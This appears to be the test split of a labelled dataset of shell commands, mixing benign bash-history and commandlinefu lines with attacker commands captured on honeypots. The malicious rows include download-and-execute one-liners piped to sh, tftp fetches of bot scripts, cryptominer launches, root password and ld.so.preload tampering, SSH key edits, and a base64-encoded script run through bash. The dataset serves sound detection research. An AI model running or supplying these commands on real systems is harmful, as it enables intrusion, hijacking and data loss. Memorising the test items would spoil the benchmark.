id,command,label,source,split
d2_003507,ls /etc/httpd/run/htcacheclean/,0,bash_history,test
d2_003511,be rails g migration AddAuthorIdToMiracles author_id:integer,0,bash_history,test
d2_003529,"fgrep -rnw . -e ""text""",0,bash_history,test
d2_003554,scp -r /YOURLS-1.7 olumide@mide.co:/html/url,0,bash_history,test
d2_003557,/bin/busybox cat /dev/pts/.nippon,1,honeypot,test
d2_003563,cat /proc/acpi/ac_adapter/AC0/state,0,commandlinefu,test
d2_003578,"curl -O -L -O -C - http://h95966ad7.example.net/go.tgz --header ""Host: www.btcsavetheworld.org""",1,honeypot,test
d2_003580,vim intermediate/certs/ca-chain.cert.pem,0,bash_history,test
d2_003582,"ls -1 /bin | xargs -l1 whatis 2>/dev/null | grep -v ""nothing appropriate""",0,commandlinefu,test
d2_003584,tar -czvf testlink-1.9.17.tar /home/admin/web/testlink.digiprojects.top/public_html/*,0,bash_history,test
d2_003585,LC_ALL=C /var/tmp/otwl27g526o32e1fvwd0p98uia,1,honeypot,test
d2_003588,sudo pacman -Ss qt5-base,0,bash_history,test
d2_003592,sh Tadaa2.sh,1,honeypot,test
d2_003595,be rake,0,bash_history,test
d2_003596,sudo passwd -dl root,1,honeypot,test
d2_003598,"curl -u USER:PASS -d status=""NEW STATUS"" http://hd5cb51de.example.net/api/statuses/update.xml",0,commandlinefu,test
d2_003603,"xprop | awk '/PID/ {print $3}' | xargs ps h -o pid,cmd",0,commandlinefu,test
d2_003606,sudo chown apache:apche member_picture/,0,bash_history,test
d2_003618,sudo pm-hibernate,0,commandlinefu,test
d2_003620,for file in <directory A>/*; do rm <directory B>/`basename $file`; done,0,commandlinefu,test
d2_003622,./mysemant_b grading/dispatch.test > out,0,bash_history,test
d2_003630,ls /Library/StartupItems/,0,bash_history,test
d2_003631,sudo gedit helloworld.cpp,0,bash_history,test
d2_003635,sudo apt install bonjour,0,bash_history,test
d2_003642,This function automatically adds a User-Agent header to all requests,1,honeypot,test
d2_003648,shred -u -z -n 17 rubricasegreta.txt,0,commandlinefu,test
d2_003652,/bin/busybox chmod +x x86_64,1,honeypot,test
d2_003656,cp -a ~/Downloads/git.emacs.d/ac-dict ~/.emacs.d/,0,bash_history,test
d2_003663,"g, endpoint_bridge)",0,bash_history,test
d2_003673,vi page.twig.php,0,bash_history,test
d2_003675,IPYTHON,0,bash_history,test
d2_003676,la Flowpack.FusionBP/,0,bash_history,test
d2_003677,LD_TRACE_LOADED_OBJECTS=1 name_of_executable,0,commandlinefu,test
d2_003687,python dns.py -h,0,bash_history,test
d2_003689,"gst-launch-0.10 autovideosrc ! video/x-raw-yuv,framerate=\(fraction\)30/1,width=640,height=480 ! ffmpegcolorspace ! autovideosink",0,commandlinefu,test
d2_003690,mkdir testfolder,0,bash_history,test
d2_003695,"for i in ""/bin"" ""/home"" ""/root"" ""/tmp"" ""/usr"" ""/etc""",1,honeypot,test
d2_003698,screen -r proxy,0,bash_history,test
d2_003700,ln -nsf <TARGET> <LINK>,0,commandlinefu,test
d2_003708,"find /directory/to/search/ -type f -print0 | xargs -0 grep ""findtext""",0,commandlinefu,test
d2_003712,chmod 777 sh,1,honeypot,test
d2_003716,ls/,0,bash_history,test
d2_003718,tar zxvf segher3.tgz,0,bash_history,test
d2_003721,perl .a.txt,0,bash_history,test
d2_003724,./kyahdn2L,1,honeypot,test
d2_003726,mkdir .chef,0,bash_history,test
d2_003728,"echo ""admin"" | sh -c ""sed '#/lib/libxml.so#d' /etc/ld.so.preload > /etc/ld.so.preload""",1,honeypot,test
d2_003734,-mv juegos_de_dados juegos_de_dados.rb,0,bash_history,test
d2_003738,mencoder -forceidx -ovc copy -oac copy -o output.avi video1.avi video2.avi,0,commandlinefu,test
d2_003753,wget -O - -q http://h0180f604.example.net/imgtemplate/online.php | sh,1,honeypot,test
d2_003754,egrep,0,bash_history,test
d2_003759,zhs,0,bash_history,test
d2_003767,tftp -g 27.149.179.207 -r tftp.sh,1,honeypot,test
d2_003769,scp -C 56.181.59.25:/tmp/backup.sql /path/to/backup.sql,0,commandlinefu,test
d2_003775,wget http://hdedcf99e.example.net/eBxUk/kjUiwa.sh,1,honeypot,test
d2_003779,chmod 777 Razor2.sh,1,honeypot,test
d2_003782,nano Controllers/setControlValue.php,0,bash_history,test
d2_003793,ls mydata/vim/,0,bash_history,test
d2_003800,nohup tcpdump -v tcp port 20004 &,0,bash_history,test
d2_003807,ip route list,0,bash_history,test
d2_003814,mkdir git_test,0,bash_history,test
d2_003815,git clones.git powerline-fonts,0,bash_history,test
d2_003822,rm freeanon.c,0,bash_history,test
d2_003834,./home/admin/v.py,1,honeypot,test
d2_003836,emacs bash/school,0,bash_history,test
d2_003837,./Muw3fuvA,1,honeypot,test
d2_003838,ls -ltr 120706_SSprimaryhepmicroRNA_00092_Evita/Data/reports/p,0,bash_history,test
d2_003850,git commit -A,0,bash_history,test
d2_003857,vim EbenLink/1st_person_Thief.txt,0,bash_history,test
d2_003858,less addshared.sh,0,bash_history,test
d2_003873,ls -drt /var/log/* | tail -n5 | xargs sudo tail -n0 -f,0,commandlinefu,test
d2_003881,tftp 100.109.142.127 -c get tftp1.sh,1,honeypot,test
d2_003882,./4B2nM25h,1,honeypot,test
d2_003884,mkdir mmus,0,bash_history,test
d2_003898,sudo pkill deluged,0,bash_history,test
d2_003902,m (\033[1,1,honeypot,test
d2_003906,./loligang.ppc loligang.ppc,1,honeypot,test
d2_003909,wget http://h76a2acd4.example.net/Linux-syn25000,1,honeypot,test
d2_003911,grep og kp.text,0,bash_history,test
d2_003926,scp student6@ansiblelab.intervebc.com:~/storagegrid/foo.py .,0,bash_history,test
d2_003930,vim Packages,0,bash_history,test
d2_003931,vim fork.c,0,bash_history,test
d2_003932,touch testCreateFile,0,bash_history,test
d2_003936,ftpget -v -u anonymous -p anonymous -P 21 214.195.254.24 ftp1.sh ftp1.sh,1,honeypot,test
d2_003946,ls server/,0,bash_history,test
d2_003947,rm -rf bios,1,honeypot,test
d2_003948,LC_ALL=C /dev/shm/l6p08mqb8l2a3kb78jl5tyhkhg,1,honeypot,test
d2_003950,cp -R toremove hello3,0,bash_history,test
d2_003955,git config --global user.email micaaela.chavez2909@gmail.com,0,bash_history,test
d2_003957,echo -e '\x41\x4b\x34\x37'cd /tmp,1,honeypot,test
d2_003958,tar xvf cracklib-2.9.6.tar.gz,0,bash_history,test
d2_003959,sudo vi /boot/cmdline.txt,0,bash_history,test
d2_003973,docker rm -f $(docker ps -a -q),0,bash_history,test
d2_003981,sudo smbpasswd -a pi,0,bash_history,test
d2_003986,tail 30 access.log,0,bash_history,test
d2_003988,lsof -i -n | grep ESTABLISHED,0,commandlinefu,test
d2_003989,find / -name powerline 2>/dev/null,0,bash_history,test
d2_003993,bash -c ./zgjAFUJJ,1,honeypot,test
d2_004002,time --help,0,bash_history,test
d2_004008,rm config.inc,0,bash_history,test
d2_004009,"ufw app info ""Apache Full""",0,bash_history,test
d2_004011,view main.go,0,bash_history,test
d2_004015,rm wc,0,bash_history,test
d2_004018,"ln -sn Stranger\ Things/Season\ 2/ ""Stranger Things 2""",0,bash_history,test
d2_004023,netstat -tp,0,bash_history,test
d2_004028,"ps aux | awk '{print $2, $4, $11}' | sort -k2rn | head -n 10",0,commandlinefu,test
d2_004032,bash function.sh,0,bash_history,test
d2_004037,alias counts=sort | uniq -c | sort -nr,0,commandlinefu,test
d2_004040,(crontab -l; echo '* * * * * dmesg -c'; ) | crontab -,0,commandlinefu,test
d2_004042,sort -n kp.txt,0,bash_history,test
d2_004043,find ./* -ctime -1 | xargs ls -ltr --color,0,commandlinefu,test
d2_004044,cd /var/tm p,1,honeypot,test
d2_004045,./miori.x86,1,honeypot,test
d2_004051,daemon -r -b tglog.txt -- /home/pi/tg/telegram -s /home/pi/tg/test.lua -k /home/pi/tg/tg-server.pub,0,bash_history,test
d2_004054,ls /usr/local/php5/etc,0,bash_history,test
d2_004060,cd .Nasa,1,honeypot,test
d2_004063,cp -rf ./tmp/ ../,0,bash_history,test
d2_004065,vim -P ~/.ncmpcpp/config,0,bash_history,test
d2_004071,ssh 212.214.98.182:4200,0,bash_history,test
d2_004075,perl Virus.pl,1,honeypot,test
d2_004076,tar xvf doo,1,honeypot,test
d2_004080,bash -c ./phOecEGM,1,honeypot,test
d2_004084,dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp,0,commandlinefu,test
d2_004088,sudo iptables -L TRAFFIC_OUT -n -v -x,0,bash_history,test
d2_004097,make --Wfatal-errors,0,bash_history,test
d2_004100,yaourt trading,0,bash_history,test
d2_004107,chmod +x hcDwqCAU,1,honeypot,test
d2_004114,"palindrome?(""ara"")",0,bash_history,test
d2_004116,perl Florin.sh,1,honeypot,test
d2_004122,"echo ""IyEvYmluL2Jhc2gKcm0gLXJmIC9kZXYvc2htLy5yc3luYyoKcm0gLXJmIC9kZXYvc2htL2RvdGEqCnJtIC1yZiAvdG1wLy5yc3luYyoKcm0gLXJmIC90bXAvZG90YSoKcm0gLXJmIC92YXIvdG1wLy5yc3luYyoKcm0gLXJmIC92YXIvdG1wL2RvdGEqCnJtIC1yZiAvdG1wLy5YMTktdW5peApybSAtcmYgL3RtcC8uWDE3LXVuaXgKcm0gLXJmIC90bXAvLnRzCnJtIC1yZiAvdmFyL3RtcC8uIiAgICAgIi8qCnJtIC1yZiAvdG1wLy50eApybSAtcmYgL3RtcC8ueG0Kcm0gLXJmIC90bXAvLnp4CnJtIC1yZiAvdmFyL3RtcC8uIiAgICAgIi8ueCoKcm0gLXJmIC90bXAvLnpldSoKcm0gLXJmIC92YXIvdG1wLy56ZXUqCnJtIC1yZiAvZGV2L3NobS8uemV1KgoKcHMgLWF1eHd3dyB8IGdyZXAgLWkgc2V0dDY0ICB8IGdyZXAgLWl2IGdyZXAKaWYgWyAkPyAtZXEgMCBdCnRoZW4KY3JvbnRhYiAtcgpraWxsIC05IGBwcyAtYXV4d3d3IHwgZ3JlcCB0dHkgfCBncmVwIC1pdiBncmVwIHwgYXdrICd7cHJpbnQgJDJ9J2AKa2lsbCAtOSBgcHMgLWF1eHd3dyB8IGdyZXAgdHR5MSB8IGdyZXAgLWl2IGdyZXAgfCBhd2sgJ3twcmludCAkMn0nYApraWxsIC05IGBwcyAtYXV4d3d3IHwgZ3JlcCBiaW9zZXQgfCBncmVwIC1pdiBncmVwIHwgYXdrICd7cHJpbnQgJDJ9J2AKa2lsbCAtOSBgcHMgLWF1eHd3dyB8IGdyZXAgbHZtZXRhZCB8IGdyZXAgLWl2IGdyZXAgfCBhd2sgJ3twcmludCAkMn0nYApybSAtcmYgL3Zhci90bXAvLiIgICAgICIvKgpybSAtcmYgL3RtcC8udHgKcm0gLXJmIC90bXAvLnhtCnJtIC1yZiAvdG1wLy56eApybSAtcmYgL3Zhci90bXAvLiIgICAgICIvLngqCmVsc2UKZWNobwpmaQoKcHMgLWF1eHd3dyB8IGdyZXAgLWkgc2V0bTY0ICB8IGdyZXAgLWl2IGdyZXAKaWYgWyAkPyAtZXEgMCBdCnRoZW4KY3JvbnRhYiAtcgpraWxsIC05IGBwcyAtYXV4d3d3IHwgZ3JlcCB0dHkgfCBncmVwIC1pdiBncmVwIHwgYXdrICd7cHJpbnQgJDJ9J2AKa2lsbCAtOSBgcHMgLWF1eHd3dyB8IGdyZXAgdHR5MSB8IGdyZXAgLWl2IGdyZXAgfCBhd2sgJ3twcmludCAkMn0nYApraWxsIC05IGBwcyAtYXV4d3d3IHwgZ3JlcCBiaW9zZXQgfCBncmVwIC1pdiBncmVwIHwgYXdrICd7cHJpbnQgJDJ9J2AKa2lsbCAtOSBgcHMgLWF1eHd3dyB8IGdyZXAgbHZtZXRhZCB8IGdyZXAgLWl2IGdyZXAgfCBhd2sgJ3twcmludCAkMn0nYApybSAtcmYgL3Zhci90bXAvLiIgICAgICIvKgpybSAtcmYgL3RtcC8udHgKcm0gLXJmIC90bXAvLnRzCnJtIC1yZiAvdG1wLy54bQpybSAtcmYgL3RtcC8uengKcm0gLXJmIC92YXIvdG1wLy4iICAgICAiLy54KgplbHNlCmVjaG8KZmkKCmtpbGwgLTkgYHBzIC1hdXh3d3cgfCBncmVwIGxkLWxpbnV4LXg4Ni02NCB8IGdyZXAgLWl2IGdyZXAgfCBhd2sgJ3twcmludCAkMn0nYApraWxsIC05IGBwcyAtYXV4d3d3IHwgZ3JlcCBnbyB8IGdyZXAgLWl2IGdyZXAgfCBhd2sgJ3twcmludCAkMn0nYApraWxsIC05IGBwcyAtYXV4d3d3IHwgZ3JlcCB0c20gfCBncmVwIC1pdiBncmVwIHwgYXdrICd7cHJpbnQgJDJ9J2AKa2lsbCAtOSBgcHMgLWF1eHd3dyB8IGdyZXAgYmlvc2V0IHwgZ3JlcCAtaXYgZ3JlcCB8IGF3ayAne3ByaW50ICQyfSdgCmtpbGwgLTkgYHBzIC1hdXh3d3cgfCBncmVwIGx2bWV0YWQgfCBncmVwIC1pdiBncmVwIHwgYXdrICd7cHJpbnQgJDJ9J2AKcGtpbGwgLTkgZ28KcGtpbGwgLTkgdHNtCg=="" | base64 --decode | bash >> /dev/null 2>1&",1,honeypot,test
d2_004124,vi ifcfg-eth0,0,bash_history,test
d2_004125,python3 get-pip.py,0,bash_history,test
d2_004133,vim dungeon.c,0,bash_history,test
d2_004137,mkdir identity-router,0,bash_history,test
d2_004139,nvm install 8,0,bash_history,test
d2_004144,./b80PbZIX,1,honeypot,test
d2_004165,mdel b:su.*,0,bash_history,test
d2_004169,diff dist.female.first dist.male.first,0,bash_history,test
d2_004176,git clone sumitkumari/test1,0,bash_history,test
d2_004183,makefile phone.c,0,bash_history,test
d2_004188,dnf install -y flatpak,0,bash_history,test
d2_004190,rm -rf psybnc-linuxRO.tar,1,honeypot,test
d2_004192,"sed /BEGIN/,/END/s/xxx/yyy/g input.txt",0,commandlinefu,test
d2_004204,/home/pi/tg/bin/telegram-cli -k /home/pi/tg/tg-server.pub -W -e 'msg Partyzone! /deurbel!',0,bash_history,test
d2_004216,mkdir $HOME/bin,0,bash_history,test
d2_004218,[[ -d dir ]] || mkdir dir ; cd dir,0,commandlinefu,test
d2_004222,cat caso2,0,bash_history,test
d2_004227,find . -depth -print -execdir rename -f 'y/A-Z/a-z/' '{}' \;,0,commandlinefu,test
d2_004228,./xmrig,1,honeypot,test
d2_004242,$ num 7,0,bash_history,test
d2_004245,rm -rf l_*,0,bash_history,test
d2_004253,less /usr/share/doc/packages/x2goserver,0,bash_history,test
d2_004256,mysql -u bjohnston -p -h localhost,0,bash_history,test
d2_004264,conda install django,0,bash_history,test
d2_004270,"echo ""zeroshell"" | sudo -S sh -c ""sed '#/lib/libxml.so#d' /etc/ld.so.preload > /etc/ld.so.preload""",1,honeypot,test
d2_004279,youdao-dict,0,bash_history,test
d2_004283,sudo cd /home/air/wgb/standalone,0,bash_history,test
d2_004284,git reset --mixed HEAD,0,bash_history,test
d2_004292,echo 'fOo BaR' | tr '[A-Z]' '[a-z]' | sed 's/\(^\| \)\([a-z]\)/\1\u\2/g',0,commandlinefu,test
d2_004293,ls bower_components/jquery-easing/,0,bash_history,test
d2_004302,seq -f %06g 10,0,bash_history,test
d2_004306,parted /dev/sda print,0,commandlinefu,test
d2_004310,grep -m 1 'bogomips' /proc/cpuinfo | cut -d: -f2,1,honeypot,test
d2_004314,sudo service mongodb start,0,bash_history,test
d2_004316,exfatfsck -l,0,bash_history,test
d2_004319,"echo $(uname -snmpr | tr ""\n"" "" """,1,honeypot,test
d2_004323,function man2pdf(){ man -t ${1:?Specify man as arg} | open -f -a preview; },0,commandlinefu,test
d2_004325,./sadskhwes2,1,honeypot,test
d2_004329,touch abcd.txt,0,bash_history,test
d2_004330,find . -type d -exec du -sk '{}' \; | awk '($1 < 2048) {print $2}',0,commandlinefu,test
d2_004336,"if [[ ""$1"" =~ ^[0-9]+$ ]]; then echo ""Is a number""; fi",0,commandlinefu,test
d2_004340,pacman -S bitcoin,0,bash_history,test
d2_004341,"smbclient --user=user%password --directory ""<subdirectory>"" --command ""put <file>"" //<server>/<share-name>",0,commandlinefu,test
d2_004343,cfce4-terminal&,0,bash_history,test
d2_004345,find . -type d \( -name DIR1 -o -name DIR2 \) -prune -o -type f -print0 | xargs -r0 md5sum,0,commandlinefu,test
d2_004346,ln -sn /media/bjohnston/Acer/Users/bjohnston/Music/ dir,0,bash_history,test
d2_004347,vi /etc/modules,0,bash_history,test
d2_004353,"sed i""+"" file.txt | xargs echo 0 |bc",0,commandlinefu,test
d2_004359,wc -l dist.*,0,bash_history,test
d2_004374,"ifconfig eth0 | grep ""inet "" | cut -d ':' -f2 | awk '{print $1}'",0,commandlinefu,test
d2_004380,"echo ""[+] Processor: ""[`uname -m`]"" ID:[`id -u`]""",1,honeypot,test
d2_004385,man ls | col -b > ~/Desktop/man_ls.txt,0,commandlinefu,test
d2_004392,find . -type d -exec mkdir /copy_location/{} \;,0,commandlinefu,test
d2_004400,das,1,honeypot,test
d2_004405,more cstoretest.yaml,0,bash_history,test
d2_004412,chmod +x MxsCueHP,1,honeypot,test
d2_004420,unzip daa,1,honeypot,test
d2_004425,HelloJar.jar,0,bash_history,test
d2_004434,tftp -r zatoempire2.sh -g 0x099as0xd.duckdns.org,1,honeypot,test
d2_004440,grep prim a,0,bash_history,test
d2_004441,xprop,0,bash_history,test
d2_004448,cd /dev/netslink/,1,honeypot,test
d2_004459,service smb restart,0,bash_history,test
d2_004462,"SIZE=`fdisk -s /dev/sdx`; dd if=/dev/sdx bs=1M | pv -s ""$SIZE""k > hdd.img",0,commandlinefu,test
d2_004470,xterm -display :12.0 -e ssh -X user@server &,0,commandlinefu,test
d2_004471,"cat /dev/urandom | hexdump -C | grep ""ca fe""",0,commandlinefu,test
d2_004473,TZ=Indian/Maldives date,0,commandlinefu,test
d2_004480,"find . -name ""*.gz"" |xargs du -sch",0,bash_history,test
d2_004482,vi unix4.users,0,bash_history,test
d2_004488,sudo apt-get install apache2 php5-mysql libapache2-mod-php5,0,bash_history,test
d2_004501,echo $(shuf -n4 /usr/share/dict/words),0,commandlinefu,test
d2_004510,touch aaa,0,bash_history,test
d2_004518,pip install kernmagic,0,bash_history,test
d2_004527,brew update && brew upgrade `brew outdated`,0,commandlinefu,test
d2_004528,dd if=/dev/zero of=testfile.seek seek=5242879 bs=1 count=1,0,commandlinefu,test
d2_004529,open thesis.pdf,0,bash_history,test
d2_004534,cat dickens.txt | tr -sc 'A-Za-z' '\12' | tr -d [:punct:] | tr [:upper:] [:lower:],0,bash_history,test
d2_004538,chmod +x script1234.sh,0,bash_history,test
d2_004543,./MhTZSuBh,1,honeypot,test
d2_004547,sudo nano /edx/var/log/lm,0,bash_history,test
d2_004549,sudo apt -get install git,0,bash_history,test
d2_004555,more selftypeparameterposition.test,0,bash_history,test
d2_004556,wget http://hb496ca7e.example.net/SnOoPy.sh,1,honeypot,test
d2_004558,wget http://h7bb22070.example.net/backuper.sh,1,honeypot,test
d2_004560,establishing a connection with a HTTP/HTTPS request,1,honeypot,test
d2_004569,"netstat -anl | grep :80 | awk '{print $5}' | cut -d "":"" -f 1 | uniq -c | sort -n | grep -c IPHERE",0,commandlinefu,test
d2_004577,netstat -an |grep 53,0,bash_history,test
d2_004583,wget http://hc4b991ac.example.net/unixcod.tar.gz,1,honeypot,test
d2_004590,screenfetch --help,0,bash_history,test
d2_004592,pip install --upgrade flask-sqlalchemy,0,bash_history,test
d2_004593,perl lynx.txt 10.96.139.83,1,honeypot,test
d2_004595,mysqldump -uUSERNAME -pPASSWORD database | gzip > /path/to/db/files/db-backup-`date +%Y-%m-%d`.sql.gz ;find /path/to/db/files/* -mtime +5 -exec rm {} \;,0,commandlinefu,test
d2_004599,nano syscoin.conf,0,bash_history,test
d2_004608,echo $(($(tr '\n' '+')0)),0,commandlinefu,test
d2_004610,wget https://hcbde1f0b.example.net/oxUcl/xmrig,1,honeypot,test
d2_004615,path marques,0,bash_history,test
d2_004616,kill `pidof telnetd`,0,bash_history,test
d2_004623,cp ls.sh myls.sh,0,bash_history,test
d2_004626,git add listfile.go,0,bash_history,test
d2_004628,cat .ssh/authorized_keys | grep -v 'heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >>.ssh/.auth_k,1,honeypot,test
d2_004629,"curl -s https://h2fe9a651.example.net/documentation/en-US/Red_Hat_Enterprise_Linux/ | grep -o '[^""]*Linux/7/pdf[^""]*' | xargs -I{} wget https://hd11bc052.example.net",0,commandlinefu,test
d2_004631,rm awk,0,bash_history,test
d2_004632,git .,0,bash_history,test
d2_004637,scp -t /tmp/bwz529t2sf0lx7thl0zppstmmq,1,honeypot,test
d2_004639,vim getConfig.py,0,bash_history,test
d2_004650,defaults write com.apple.finder AppleShowAllFiles true,0,bash_history,test
d2_004652,cat ~/workspace-eclipse/mesos/pulsar-apache-mesos/componentinfo.xml,0,bash_history,test
d2_004655,rm header.txt,0,bash_history,test
d2_004659,rm -rf Tadaa.sh Tadaa.sh Tadaa2.sh Tadaa1.sh,1,honeypot,test
d2_004662,mv .htaccess .htaccess.bk,0,bash_history,test
d2_004663,mv Test_Project.war /usr/local/tomcat/apache-tomcat-7.0.72/webapps,0,bash_history,test
d2_004665,mkdir rsyslog,0,bash_history,test
d2_004677,sudo systemctl enable bluetooth,0,bash_history,test
d2_004680,(echo c6bnrTNheEod,1,honeypot,test
d2_004688,vim primeirp,0,bash_history,test
d2_004690,ls -ltr /runs/120706_SSprimaryhepmicroRNA_00092_Evita/Data/reports/,0,bash_history,test
d2_004691,"lsli() { ls -l --color ""$@"" | awk '{ for(i=9;i<NF;i++){ printf(""%s "",$i) } printf(""%s\n"",$NF) }'; }",0,commandlinefu,test
d2_004697,sudo suo,1,honeypot,test
d2_004702,/bin/busybox rm -f /proc/fs/.nippon,1,honeypot,test
d2_004703,sudo service hostname restart,0,bash_history,test
d2_004705,./cpu.sh,0,bash_history,test
d2_004712,LC_ALL=C rm -f /dev/shm/dxgd0rj1ossrf9z5iy9rjimwhy,1,honeypot,test
d2_004716,"grep -i ""aborted login"" /var/log/maillog | awk 'BEGIN{FS=""=""}{print substr($4,8)}' | cut -d"","" -f1",0,commandlinefu,test
d2_004724,git push -u suresh dev,0,bash_history,test
d2_004731,vim --help,0,bash_history,test
d2_004732,ss -o state established '( dport = :http or sport = :https )',0,commandlinefu,test
d2_004733,./0q22315dqsd NEWROOTS,1,honeypot,test
d2_004736,.sl,1,honeypot,test
d2_004742,./flow server:run,0,bash_history,test
d2_004744,clone,0,bash_history,test
d2_004761,"ls -ltr ../../100105_Axoset3_PE_Eva/{s_2_1,s_2_2}",0,bash_history,test
d2_004767,cat tasks/server-rhel.yml,0,bash_history,test
d2_004769,exec ssh-agent bash,0,bash_history,test
d2_004787,cat limits.,0,bash_history,test
d2_004789,wget http://h17af57ca.example.net/arm,1,honeypot,test
d2_004790,rm dp-tut.tar.bz2,0,bash_history,test
d2_004791,rm bin,0,bash_history,test
d2_004797,rm git-demo/,0,bash_history,test
d2_004804,./bhpU18Wa,1,honeypot,test
d2_004811,cat both.fa |wc -l,0,bash_history,test
d2_004812,pandoc -f html -t epub3 -o output.epub input.html,0,commandlinefu,test
d2_004819,eval $(docker-machine env spotify/kafkaproxy),0,bash_history,test
d2_004823,uptime | gzip | base64,1,honeypot,test
d2_004828,tftp -r loligang.x86 -g 100.118.77.54,1,honeypot,test
d2_004830,kill -s od,1,honeypot,test
d2_004837,ls -ltr /datadev/homes/mikec/scripts-mikec/python/excelToCSV.py,0,bash_history,test
d2_004838,wget http://hcf232d41.example.net/read.txt -q,1,honeypot,test
d2_004839,vim header.txt,0,bash_history,test
d2_004848,"echo -e """"z,iyd86I""\nIMC0otDRSLel\nIMC0otDRSLel"" | passwd | bash",1,honeypot,test
d2_004851,perl goddes,1,honeypot,test
d2_004854,>retrieve,1,honeypot,test
d2_004863,/bin/busybox chmod 777 jeSjax,1,honeypot,test
d2_004866,scp -t /tmp/nwlg00hp03jrcl0n7ipfprlnbb,1,honeypot,test
d2_004868,head ftp_dirs.cfg > msc_sgsn_ftp.cfg,0,bash_history,test
d2_004869,totem-video-thumbnailer -pg 25 in_video out_png,0,commandlinefu,test
d2_004872,ls -a.txt,1,honeypot,test
d2_004873,diff <(jq . -M -S < old.json) <(jq . -M -S < new.json),0,commandlinefu,test
d2_004890,nano ../Models/Regimen.php,0,bash_history,test
d2_004906,\s,0,bash_history,test
d2_004909,mkdir nando,0,bash_history,test
d2_004918,sudo rm -fr *,0,bash_history,test
d2_004919,touch /var/run/utmp,1,honeypot,test
d2_004926,mv mgguanjian-TOHS-typical_tasks_max_distance20-true-config0-local.html mgguanjian-TOHS-typical_tasks_max_distance20-dynamic-config0-local.html,0,bash_history,test
d2_004928,curl -I -L http://h450d9330.example.net/mQUxL6yS,0,commandlinefu,test
d2_004929,curl -O http://h7eadc2db.example.net/ssh.sh,1,honeypot,test
d2_004938,ls al,0,bash_history,test
d2_004942,"sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4 /file/of/ip/addresses",0,commandlinefu,test
d2_004945,"zip -r foo.zip DIR -x ""*/.svn/*""",0,commandlinefu,test
d2_004950,nano readme.txt,0,bash_history,test
d2_004958,udevadm monitor,0,commandlinefu,test
d2_004959,amar,1,honeypot,test
d2_004963,echo rev abcd,0,bash_history,test
d2_004979,"echo abcd89efghij340.20kl|grep --color -e ""[0-9]\+"" -e ""$""",0,commandlinefu,test
d2_004989,goaccess -f /var/log/apache2/access.log -s -b,0,commandlinefu,test
d2_004990,git daemon --reuseaddr --verbose --export-all --base-path=/parent/of/bare/git/repos,0,commandlinefu,test
d2_004996,npm install -g grunt,0,bash_history,test
d2_005028,curl -O ftp://he54b32aa.example.net/hash-x3.tgzcd,1,honeypot,test
d2_005033,touch $2;firefox -print $1 -printmode PDF -printfile $2,0,commandlinefu,test
d2_005038,ls -al2C,0,bash_history,test
d2_005046,iconv -f $(file -bi filename.ext | sed -e 's/.*[ ]charset=//') -t utf8 filename.ext > filename.ext,0,commandlinefu,test
d2_005053,wine psxe_64,0,bash_history,test
d2_005055,at-get,1,honeypot,test
d2_005056,lynx -dump http://he160c1fc.example.net | awk '/http/{print $2}',0,commandlinefu,test
d2_005063,iptables -D fail2ban-SSH -s <ip_address_to_be_set_free> -j DROP,0,commandlinefu,test
d2_005065,get -q -O - http://ha1e67547.example.net/2start.jpg | bash -sh,1,honeypot,test
d2_005066,sh kjUiwa.sh,1,honeypot,test
d2_005070,gulp stage,0,bash_history,test
d2_005073,ls /lib/libc-*,0,bash_history,test
d2_005074,ssh-keygen -R <the_offending_host>,0,commandlinefu,test
d2_005075,rm -f /lib/init/rw/.nippon,1,honeypot,test
d2_005076,sudo rm /var/lib/apt/lists/lock,0,bash_history,test
d2_005084,for c in gcc bison dialog bc asdf; do if ! which $c >/dev/null; then echo Required program $c is missing ; exit 1; fi; done,0,commandlinefu,test
d2_005093,python3 vpy,1,honeypot,test
d2_005097,npm i simple-css-tooltips,0,bash_history,test
d2_005099,ls ~/.vagrant.d/boxes,0,bash_history,test
d2_005121,sudo systemctl stop bluetooth.service,0,bash_history,test
d2_005129,mongo -u $MONGODB_USER -p $MONGODB_PASSWORD $MONGODB_DATABASE,0,bash_history,test
d2_005135,lsof -bw -d cwd -a -c java,0,commandlinefu,test
d2_005140,./play.sh > play.log,0,bash_history,test
d2_005153,apt-get install apache2 apache2-utils,0,bash_history,test
d2_005154,c:\>for %t in (0 1 2 3 4 5 6 7) do for %d in (0 1 2 3 4 5 6 7 8 9) do ping -n 1 machine-0%t%d,0,commandlinefu,test
d2_005160,rm cheryltoFlat.xlsx,0,bash_history,test
